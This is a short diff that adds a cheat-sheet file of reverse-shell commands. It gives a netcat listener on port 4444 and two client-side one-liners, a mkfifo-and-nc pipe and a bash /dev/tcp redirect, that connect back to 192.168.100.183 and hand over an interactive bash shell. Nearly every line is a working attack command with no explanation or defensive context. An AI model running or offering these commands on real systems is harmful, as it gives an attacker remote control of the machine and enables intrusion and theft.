@@ -1,0 +1,9 @@
+on server side:
+nc -lvp 4444
+on the client side:
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.100.183 4444 > /tmp/f
+
+or
+
+bash -i >& /dev/tcp/192.168.100.183/4444 0>&1
+
